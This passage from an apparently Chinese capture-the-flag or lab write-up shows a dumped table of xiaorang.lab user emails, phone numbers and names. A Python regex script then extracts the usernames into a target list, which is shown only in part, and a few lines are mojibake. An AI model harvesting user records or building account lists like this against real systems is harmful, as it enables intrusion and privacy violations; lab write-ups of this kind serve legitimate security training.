class="line">| 293 | lefen@xiaorang.lab         | 13271196544 | LE FEN          |</span><br><span class="line">| 294 | yubo@xiaorang.lab          | 13462202742 | YU BO           |</span><br><span class="line">| 295 | helianrui@xiaorang.lab     | 15383000907 | HE LIAN RUI     |</span><br><span class="line">| 296 | xuanqun@xiaorang.lab       | 18843916267 | XUAN QUN        |</span><br><span class="line">| 297 | shangjun@xiaorang.lab      | 15162486698 | SHANG JUN       |</span><br><span class="line">| 298 | huguang@xiaorang.lab       | 18100586324 | HU GUANG        |</span><br><span class="line">| 299 | wansifu@xiaorang.lab       | 18494761349 | WAN SI FU       |</span><br><span class="line">| 300 | fenghong@xiaorang.lab      | 13536727314 | FENG HONG       |</span><br><span class="line">| 301 | wanyan@xiaorang.lab        | 17890844429 | WAN YAN         |</span><br><span class="line">| 302 | diyan@xiaorang.lab         | 18534028047 | DI YAN          |</span><br><span class="line">| 303 | xiangyu@xiaorang.lab       | 13834043047 | XIANG YU        |</span><br><span class="line">| 304 | songyan@xiaorang.lab       | 15282433280 | SONG YAN        |</span><br><span class="line">| 305 | fandi@xiaorang.lab         | 15846960039 | FAN DI          |</span><br><span class="line">| 306 | xiangjuan@xiaorang.lab     | 18120327434 | XIANG JUAN      |</span><br><span class="line">| 307 | beirui@xiaorang.lab        | 18908661803 | BEI RUI         |</span><br><span class="line">| 308 | didi@xiaorang.lab          | 13413041463 | DI DI           |</span><br><span class="line">| 309 | zhubin@xiaorang.lab        | 15909558554 | ZHU BIN         |</span><br><span class="line">| 310 | lingchun@xiaorang.lab      | 13022790678 | LING CHUN       |</span><br><span class="line">| 311 | zhenglu@xiaorang.lab       | 13248244873 | ZHENG LU        |</span><br><span class="line">| 312 | xundi@xiaorang.lab         | 18358493414 | XUN DI          |</span><br><span class="line">| 313 | wansishun@xiaorang.lab     | 18985028319 | WAN SI SHUN     |</span><br><span class="line">| 314 | yezongyue@xiaorang.lab     | 13866302416 | YE ZONG YUE     |</span><br><span class="line">| 315 | bianmei@xiaorang.lab       | 18540879992 | BIAN MEI        |</span><br><span class="line">| 316 | shanshao@xiaorang.lab      | 18791488918 | SHAN SHAO       |</span><br><span class="line">| 317 | zhenhui@xiaorang.lab       | 13736784817 | ZHEN HUI        |</span><br><span class="line">| 318 | chengli@xiaorang.lab       | 15913267394 | CHENG LI        |</span><br><span class="line">| 319 | yufen@xiaorang.lab         | 18432795588 | YU FEN          |</span><br><span class="line">| 320 | jiyi@xiaorang.lab          | 13574211454 | JI YI           |</span><br><span class="line">| 321 | panbao@xiaorang.lab        | 13675851303 | PAN BAO         |</span><br><span class="line">| 322 | mennane@xiaorang.lab       | 15629706208 | MEN NAN E       |</span><br><span class="line">| 323 | fengsi@xiaorang.lab        | 13333432577 | FENG SI         |</span><br><span class="line">| 324 | mingyan@xiaorang.lab       | 18296909463 | MING YAN        |</span><br><span class="line">| 325 | luoyou@xiaorang.lab        | 15759321415 | LUO YOU         |</span><br><span class="line">| 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING |</span><br><span class="line">| 327 | nongyan@xiaorang.lab       | 18097386975 | NONG YAN        |</span><br><span class="line">| 328 | haolun@xiaorang.lab        | 15152700465 | HAO LUN         |</span><br><span class="line">| 329 | oulun@xiaorang.lab         | 13402760696 | OU LUN          |</span><br><span class="line">| 330 | weichipeng@xiaorang.lab    | 18057058937 | WEI CHI PENG    |</span><br><span class="line">| 331 | qidiaofang@xiaorang.lab    | 18728297829 | QI DIAO FANG    |</span><br><span class="line">| 332 | xuehe@xiaorang.lab         | 13398862169 | XUE HE          |</span><br><span class="line">| 333 | chensi@xiaorang.lab        | 18030178713 | CHEN SI         |</span><br><span class="line">| 334 | guihui@xiaorang.lab        | 17882514129 | GUI HUI         |</span><br><span class="line">| 335 | fuyue@xiaorang.lab         | 18298436549 | FU YUE          |</span><br><span class="line">| 336 | wangxing@xiaorang.lab      | 17763645267 | WANG XING       |</span><br><span class="line">| 337 | zhengxiao@xiaorang.lab     | 18673968392 | ZHENG XIAO      |</span><br><span class="line">| 338 | guhui@xiaorang.lab         | 15166711352 | GU HUI          |</span><br><span class="line">| 339 | baoai@xiaorang.lab         | 15837430827 | BAO AI          |</span><br><span class="line">| 340 | hangzhao@xiaorang.lab      | 13235488232 | HANG ZHAO       |</span><br><span class="line">| 341 | xingye@xiaorang.lab        | 13367587521 | XING YE         |</span><br><span class="line">| 342 | qianyi@xiaorang.lab        | 18657807767 | QIAN YI         |</span><br><span class="line">| 343 | xionghong@xiaorang.lab     | 17725874584 | XIONG HONG      |</span><br><span class="line">| 344 | zouqi@xiaorang.lab         | 15300430128 | ZOU QI          |</span><br><span class="line">| 345 | rongbiao@xiaorang.lab      | 13034242682 | RONG BIAO       |</span><br><span class="line">| 346 | gongxin@xiaorang.lab       | 15595839880 | GONG XIN        |</span><br><span class="line">| 347 | luxing@xiaorang.lab        | 18318675030 | LU XING         |</span><br><span class="line">| 348 | huayan@xiaorang.lab        | 13011805354 | HUA YAN         |</span><br><span class="line">| 349 | duyue@xiaorang.lab         | 15515878208 | DU YUE          |</span><br><span class="line">| 350 | xijun@xiaorang.lab         | 17871583183 | XI JUN          |</span><br><span class="line">| 351 | daiqing@xiaorang.lab       | 18033226216 | DAI QING        |</span><br><span class="line">| 352 | yingbiao@xiaorang.lab      | 18633421863 | YING BIAO       |</span><br><span class="line">| 353 | hengteng@xiaorang.lab      | 15956780740 | HENG TENG       |</span><br><span class="line">| 354 | changwu@xiaorang.lab       | 15251485251 | CHANG WU        |</span><br><span class="line">| 355 | chengying@xiaorang.lab     | 18788248715 | CHENG YING      |</span><br><span class="line">| 356 | luhong@xiaorang.lab        | 17766091079 | LU HONG         |</span><br><span class="line">| 357 | tongxue@xiaorang.lab       | 18466102780 | TONG XUE        |</span><br><span class="line">| 358 | xiangqian@xiaorang.lab     | 13279611385 | XIANG QIAN      |</span><br><span class="line">| 359 | shaokang@xiaorang.lab      | 18042645434 | SHAO KANG       |</span><br><span class="line">| 360 | nongzhu@xiaorang.lab       | 13934236634 | NONG ZHU        |</span><br><span class="line">| 361 | haomei@xiaorang.lab        | 13406913218 | HAO MEI         |</span><br><span class="line">| 362 | maoqing@xiaorang.lab       | 15713298425 | MAO QING        |</span><br><span class="line">| 363 | xiai@xiaorang.lab          | 18148404789 | XI AI           |</span><br><span class="line">| 364 | bihe@xiaorang.lab          | 13628593791 | BI HE           |</span><br><span class="line">| 365 | gaoli@xiaorang.lab         | 15814408188 | GAO LI          |</span><br><span class="line">| 366 | jianggong@xiaorang.lab     | 15951118926 | JIANG GONG      |</span><br><span class="line">| 367 | pangning@xiaorang.lab      | 13443921700 | PANG NING       |</span><br><span class="line">| 368 | ruishi@xiaorang.lab        | 15803112819 | RUI SHI         |</span><br><span class="line">| 369 | wuhuan@xiaorang.lab        | 13646953078 | WU HUAN         |</span><br><span class="line">| 370 | qiaode@xiaorang.lab        | 13543564200 | QIAO DE         |</span><br><span class="line">| 371 | mayong@xiaorang.lab        | 15622971484 | MA YONG         |</span><br><span class="line">| 372 | hangda@xiaorang.lab        | 15937701659 | HANG DA         |</span><br><span class="line">| 373 | changlu@xiaorang.lab       | 13734991654 | CHANG LU        |</span><br><span class="line">| 374 | liuyuan@xiaorang.lab       | 15862054540 | LIU YUAN        |</span><br><span class="line">| 375 | chenggu@xiaorang.lab       | 15706685526 | CHENG GU        |</span><br><span class="line">| 376 | shentuyun@xiaorang.lab     | 15816902379 | SHEN TU YUN     |</span><br><span class="line">| 377 | zhuangsong@xiaorang.lab    | 17810274262 | ZHUANG SONG     |</span><br><span class="line">| 378 | chushao@xiaorang.lab       | 18822001640 | CHU SHAO        |</span><br><span class="line">| 379 | heli@xiaorang.lab          | 13701347081 | HE LI           |</span><br><span class="line">| 380 | haoming@xiaorang.lab       | 15049615282 | HAO MING        |</span><br><span class="line">| 381 | xieyi@xiaorang.lab         | 17840660107 | XIE YI          |</span><br><span class="line">| 382 | shangjie@xiaorang.lab      | 15025010410 | SHANG JIE       |</span><br><span class="line">| 383 | situxin@xiaorang.lab       | 18999728941 | SI TU XIN       |</span><br><span class="line">| 384 | linxi@xiaorang.lab         | 18052976097 | LIN XI          |</span><br><span class="line">| 385 | zoufu@xiaorang.lab         | 15264535633 | ZOU FU          |</span><br><span class="line">| 386 | qianqing@xiaorang.lab      | 18668594658 | QIAN QING       |</span><br><span class="line">| 387 | qiai@xiaorang.lab          | 18154690198 | QI AI           |</span><br><span class="line">| 388 | ruilin@xiaorang.lab        | 13654483014 | RUI LIN         |</span><br><span class="line">| 389 | luomeng@xiaorang.lab       | 15867095032 | LUO MENG        |</span><br><span class="line">| 390 | huaren@xiaorang.lab        | 13307653720 | HUA REN         |</span><br><span class="line">| 391 | yanyangmei@xiaorang.lab    | 15514015453 | YAN YANG MEI    |</span><br><span class="line">| 392 | zuofen@xiaorang.lab        | 15937087078 | ZUO FEN         |</span><br><span class="line">| 393 | manyuan@xiaorang.lab       | 18316106061 | MAN YUAN        |</span><br><span class="line">| 394 | yuhui@xiaorang.lab         | 18058257228 | YU HUI          |</span><br><span class="line">| 395 | sunli@xiaorang.lab         | 18233801124 | SUN LI          |</span><br><span class="line">| 396 | guansixin@xiaorang.lab     | 13607387740 | GUAN SI XIN     |</span><br><span class="line">| 397 | ruisong@xiaorang.lab       | 13306021674 | RUI SONG        |</span><br><span class="line">| 398 | qiruo@xiaorang.lab         | 13257810331 | QI RUO          |</span><br><span class="line">| 399 | jinyu@xiaorang.lab         | 18565922652 | JIN YU          |</span><br><span class="line">| 400 | shoujuan@xiaorang.lab      | 18512174415 | SHOU JUAN       |</span><br><span class="line">| 401 | yanqian@xiaorang.lab       | 13799789435 | YAN QIAN        |</span><br><span class="line">| 402 | changyun@xiaorang.lab      | 18925015029 | CHANG YUN       |</span><br><span class="line">| 403 | hualu@xiaorang.lab         | 13641470801 | HUA LU          |</span><br><span class="line">| 404 | huanming@xiaorang.lab      | 15903282860 | HUAN MING       |</span><br><span class="line">| 405 | baoshao@xiaorang.lab       | 13795275611 | BAO SHAO        |</span><br><span class="line">| 406 | hongmei@xiaorang.lab       | 13243605925 | HONG MEI        |</span><br><span class="line">| 407 | manyun@xiaorang.lab        | 13238107359 | MAN YUN         |</span><br><span class="line">| 408 | changwan@xiaorang.lab      | 13642205622 | CHANG WAN       |</span><br><span class="line">| 409 | wangyan@xiaorang.lab       | 13242486231 | WANG YAN        |</span><br><span class="line">| 410 | shijian@xiaorang.lab       | 15515077573 | SHI JIAN        |</span><br><span class="line">| 411 | ruibei@xiaorang.lab        | 18157706586 | RUI BEI         |</span><br><span class="line">| 412 | jingshao@xiaorang.lab      | 18858376544 | JING SHAO       |</span><br><span class="line">| 413 | jinzhi@xiaorang.lab        | 18902437082 | JIN ZHI         |</span><br><span class="line">| 414 | yuhui@xiaorang.lab         | 15215599294 | YU HUI          |</span><br><span class="line">| 415 | zangpeng@xiaorang.lab      | 18567574150 | ZANG PENG       |</span><br><span class="line">| 416 | changyun@xiaorang.lab      | 15804640736 | CHANG YUN       |</span><br><span class="line">| 417 | yetai@xiaorang.lab         | 13400150018 | YE TAI          |</span><br><span class="line">| 418 | luoxue@xiaorang.lab        | 18962643265 | LUO XUE         |</span><br><span class="line">| 419 | moqian@xiaorang.lab        | 18042706956 | MO QIAN         |</span><br><span class="line">| 420 | xupeng@xiaorang.lab        | 15881934759 | XU PENG         |</span><br><span class="line">| 421 | ruanyong@xiaorang.lab      | 15049703903 | RUAN YONG       |</span><br><span class="line">| 422 | guliangxian@xiaorang.lab   | 18674282714 | GU LIANG XIAN   |</span><br><span class="line">| 423 | yinbin@xiaorang.lab        | 15734030492 | YIN BIN         |</span><br><span class="line">| 424 | huarui@xiaorang.lab        | 17699257041 | HUA RUI         |</span><br><span class="line">| 425 | niuya@xiaorang.lab         | 13915041589 | NIU YA          |</span><br><span class="line">| 426 | guwei@xiaorang.lab         | 13584571917 | GU WEI          |</span><br><span class="line">| 427 | qinguan@xiaorang.lab       | 18427953434 | QIN GUAN        |</span><br><span class="line">| 428 | yangdanhan@xiaorang.lab    | 15215900100 | YANG DAN HAN    |</span><br><span class="line">| 429 | yingjun@xiaorang.lab       | 13383367818 | YING JUN        |</span><br><span class="line">| 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         |</span><br><span class="line">| 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     |</span><br><span class="line">| 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        |</span><br><span class="line">| 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        |</span><br><span class="line">| 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         |</span><br><span class="line">| 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       |</span><br><span class="line">| 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        |</span><br><span class="line">| 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   |</span><br><span class="line">| 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    |</span><br><span class="line">| 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       |</span><br><span class="line">| 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        |</span><br><span class="line">| 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     |</span><br><span class="line">| 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     |</span><br><span class="line">| 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           |</span><br><span class="line">| 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          |</span><br><span class="line">| 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         |</span><br><span class="line">| 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          |</span><br><span class="line">| 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          |</span><br><span class="line">| 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        |</span><br><span class="line">| 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  |</span><br><span class="line">| 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     |</span><br><span class="line">| 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          |</span><br><span class="line">| 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      |</span><br><span class="line">| 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        |</span><br><span class="line">| 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    |</span><br><span class="line">| 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       |</span><br><span class="line">| 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         |</span><br><span class="line">| 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          |</span><br><span class="line">| 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        |</span><br><span class="line">| 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          |</span><br><span class="line">| 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         |</span><br><span class="line">| 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        |</span><br><span class="line">| 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       |</span><br><span class="line">| 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         |</span><br><span class="line">| 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         |</span><br><span class="line">| 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      |</span><br><span class="line">| 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         |</span><br><span class="line">| 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       |</span><br><span class="line">| 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        |</span><br><span class="line">| 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        |</span><br><span class="line">| 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          |</span><br><span class="line">| 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       |</span><br><span class="line">| 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           |</span><br><span class="line">| 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       |</span><br><span class="line">| 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        |</span><br><span class="line">| 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         |</span><br><span class="line">| 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         |</span><br><span class="line">| 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       |</span><br><span class="line">| 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       |</span><br><span class="line">| 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           |</span><br><span class="line">| 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        |</span><br><span class="line">| 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         |</span><br><span class="line">| 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         |</span><br><span class="line">| 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       |</span><br><span class="line">| 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         |</span><br><span class="line">| 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         |</span><br><span class="line">| 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   |</span><br><span class="line">| 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        |</span><br><span class="line">| 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       |</span><br><span class="line">| 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          |</span><br><span class="line">| 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        |</span><br><span class="line">| 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          |</span><br><span class="line">| 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    |</span><br><span class="line">| 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           |</span><br><span class="line">| 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          |</span><br><span class="line">| 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         |</span><br><span class="line">| 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         |</span><br><span class="line">| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |</span><br><span class="line">| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |</span><br><span class="line">| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |</span><br><span class="line">| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |</span><br><span class="line">+-----+----------------------------+-------------+-----------------+</span><br></pre></td></tr></table></figure><p>è¿™è¾¹å†™ä¸ªè„šæœ¬æå–ç”¨æˆ·å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># æ‰“å¼€åŸå§‹æ•°æ®æ–‡ä»¶</span><br><span class="line">with open(&#x27;1.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"># æå–æŒ‡å®šå­—ç¬¦ä¸²</span><br><span class="line">users = []</span><br><span class="line">for line in data:</span><br><span class="line">    match = re.search(r&#x27;(\w+)@xiaorang.lab&#x27;, line)</span><br><span class="line">    if match:</span><br><span class="line">        username = match.group(1)</span><br><span class="line">        users.append(username)</span><br><span class="line"></span><br><span class="line"># ä¿å­˜æå–åçš„å­—ç¬¦ä¸²åˆ° user.txt</span><br><span class="line">with open(&#x27;user.txt&#x27;, &#x27;w&#x27;) as file:</span><br><span class="line">    for user in users:</span><br><span class="line">        file.write(user + &#x27;\n&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line">chenyan</span><br><span class="line">tanggui</span><br><span class="line">buning</span><br><span class="line">beishu</span><br><span class="line">shushi</span><br><span class="line">fuyi</span><br><span class="line">pangcheng</span><br><span class="line">tonghao</span><br><span class="line">jiaoshan</span><br><span class="line">dulun</span><br><span class="line">kejuan</span><br><span class="line">gexin</span><br><span class="line">lugu</span><br><span class="line">guzaicheng</span><br><span class="line">feicai</span><br><span class="line">ranqun</span><br><span class="line">zhouyi</span><br><span class="line">shishu</span><br><span class="line">yanyun</span><br><span class="line">chengqiu</span><br><span class="line">louyou</span><br><span class="line">maqun</span><br><span class="line">wenbiao</span><br><span class="line">weishengshan</span><br><span class="line">zhangxin</span><br><span class="line">chuyuan</span><br><span class="line">wenliang</span><br><span class="line">yulvxue</span><br><span class="line">luyue</span><br><span class="line">ganjian</span><br><span class="line">pangzhen</span><br><span class="line">guohong</span><br><span class="line">lezhong</span><br><span class="line">sheweiyue</span><br><span class="line">dujian</span><br><span class="line">lidongjin</span><br><span class="line">hongqun</span><br><span class="line">yexing</span><br><span class="line">maoda</span><br><span class="line">qiaomei</span><br><span class="line">nongzhen</span><br><span class="line">dongshu</span><br><span class="line">zhuzhu</span><br><span class="line">jiyun</span><br><span class="line">qiguanrou</span><br><span class="line">yixue</span><br><span class="line">chujun</span><br><span class="line">shenshan</span><br><span class="line">lefen</span><br><span class="line">yubo</span><br><span class="line">helianrui</span><br><span class="line">xuanqun</span><br><span class="line">shangjun</span><br><span class="line">huguang</span><br><span class="line">wansifu</span><br><span class="line">fenghong</span><br><span class="line">wanyan</span><br><span class="line">diyan</span><br><span class="line">xiangyu</span><br><span class="line">songyan</span><br><span class="line">fandi</span><br><span class="line">xiangjuan</span><br><span class="line">beirui</span><br><span class="line">didi</span><br><span class="line">zhubin</span><br><span class="line">lingchun</span><br><span class="line">zhenglu</span><br><span class="line">xundi</span><br><span class="line">wansishun</span><br><span class="line">yezongyue</span><br><span class="line">bianmei</span><br><span class="line">shanshao</span><br><span class="line">zhenhui</span><br><span class="line">chengli</span><br><span class="line">yufen</span><br><span class="line">jiyi</span><br><span class="line">panbao</span><br><span class="line">mennane</span><br><span class="line">fengsi</span><br><span class="line">mingyan</span><br><span class="line">luoyou</span><br><span class="line">liangduanqing</span><br><span class="line">nongyan</span><br><span class="line">haolun</span><br><span class="line">oulun</span><br><span class="line">weichipeng</span><br><span class="line">qidiaofang</span><br><span class="line">xuehe</span><br><span class="line">chensi</span><br><span class="line">guihui</span><br><span class="line">fuyue</span><br><span class="line">wangxing</span><br><span class="line">zhengxiao</span><br><span class="line">guhui</span><br><span class="line">baoai</span><br><span class="line">hangzhao</span><br><span class="line">xingye</span><br><span class="line">qianyi</span><br><span class="line">xionghong</span><br><span class="line">zouqi</span><br><span class="line">rongbiao</span><br><span class="line">gongxin</span><br><span class="line">luxing</span><br><span class="line">huayan</span><br><span class="line">duyue</span><br><span class="line">xijun</span><br><span class="line">daiqing</span><br><span class="line">yingbiao</span><br><span class="line">hengteng</span><br><span class="line">changwu</span><br><span class="line">chengying</span><br><span class="line">luhong</span><br><span class="line">tongxue</span><br><span class="line">xiangqian</span><br><span class="line">shaokang</span><br><span class="line">nongzhu</span><br><span class="line">haomei</span><br><span class="line">maoqing</span><br><span class="line">xiai</span><br><span class="line">bihe</span><br><span class="line">gaoli</span><br><span class="line">jianggong</span><br><span class="line">pangning</span><br><span class="line">ruishi</span><br><span class="line">wuhuan</span><br><span class="line">qiaode</span><br><span class="line">mayong</span><br><span class="line">hangda</span><br><span class="line">changlu</span><br><span class="line">liuyuan</span><br><span class="line">chenggu</span><br><span class="line">shentuyun</span><br><span class="line">zhuangsong</span><br><span class="line">chushao</span><br><span class="line">heli</span><br><span class="line">haoming</span><br><span class="line">xieyi</span><br><span class="line">shangjie</span><br><span class="line">situxin</span><br><span 